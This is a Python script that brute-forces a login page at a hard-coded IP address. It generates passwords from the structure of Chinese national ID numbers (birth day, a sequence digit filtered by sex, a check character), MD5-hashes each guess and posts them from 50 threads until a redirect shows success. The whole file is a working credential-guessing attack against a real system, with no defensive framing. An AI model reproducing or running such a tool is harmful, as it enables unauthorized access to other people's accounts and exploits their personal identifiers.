cookies = {
        'ASP.NET_SessionId': 'mj2pw3vivqiaej4jrsv0w1ql'
        }
header = {
        'Date':'Tue, 05 Jul 2016 06:17:26 GMT',
        'Server':'Microsoft-IIS/6.0',
        'X-Powered-By': 'ASP.NET',
        'X-AspNet-Version': '4.0.30319',
        'Location': '/default.aspx',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Expires': '-1',
        'Content-Type': 'text/html; charset=utf-8',
        'Content-Length':  '130',
        'Accept-encoding':'gzip'
        }

import requests, re, hashlib, threading, queue
import sys, datetime

begintime = datetime.datetime.now()
startpoint = 0
generatestep = 1
processnum = 50
# Usage command + id, processnum, sex, startpoint, all aboves are optional
if len(sys.argv) > 5:
    print ("Too many argument")
if len(sys.argv) >= 2:
    print (sys.argv[1])
if len(sys.argv) >= 3:
    processnum = int(sys.argv[2])
if len(sys.argv) >= 4:
    sex = sys.argv[3];
    if sex == 'girl' or sex == 'boy':
        generatestep  = 2
    if sex == 'boy':
        startpoint = 1
if len(sys.argv) >= 5:
    startpoint = int(sys.argv[4])

class aolang(threading.Thread):

    def __init__(self, cqueue):
        threading.Thread.__init__(self)
        self.cqueue = cqueue
        self.stop_flag= False

    def run(self):
        data = {
        '__VIEWSTATE': 'go6WJBsZ1m4enxs9VlUqZsA0+FTdNM2Yz9OydXYB6rSwW+fW9jeNXI++1nqQxQanNDy75AkmU8tccZCEJOrAdL34sqobmhKbrvvkIHCCytc5JGkOi80L+eSlLUs=',
        '__VIEWSTATEGENERATOR': 'C2EE9ABB',
        'userbh': 'B13050824',
        'pass': '78E636941E3FC7385F49DBB3B4FAA6CC', 
        'cw': '', 
        'xzbz': '1' 
        }
        if len(sys.argv) >= 2:
            data['userbh'] = sys.argv[1]
        while not self.cqueue.empty():
            if self.stop_flag:
                return
            string = self.cqueue.get()
            ss = requests.session()
            codemd5 = hashlib.md5(string.upper().encode()).hexdigest().upper()
            data['pass'] = codemd5
            for i in range(1, 100):
                try:
                    r2 = ss.post('http://180.209.64.253:866/login.aspx', data = data)
                except:
                    continue
                break

            print ((string) + '   ' + str(datetime.datetime.now()-begintime))
            if len(r2.history) != 0:
                for thread in threading.enumerate():
                    thread.stop_flag = True
                print ('The code is ' + string)
                return

codequeue = queue.Queue()

for i in range(startpoint, 1000, generatestep):
    indexstring = str(i)
    indexstring = (3 - len(indexstring))*'0' + indexstring
    for j in range(0, 11):
        if j == 10:
            indexstring2 = indexstring + 'X'
        else:
            indexstring2 = indexstring + str(j)
        for k in range(1, 32):
            birthstring = str(k)
            if len(birthstring) < 2:
                birthstring = '0' + birthstring
            codestring = birthstring + indexstring2
            codequeue.put(codestring)

for i in range(1, processnum+1):
    aspider = aolang(codequeue)
    aspider.start()
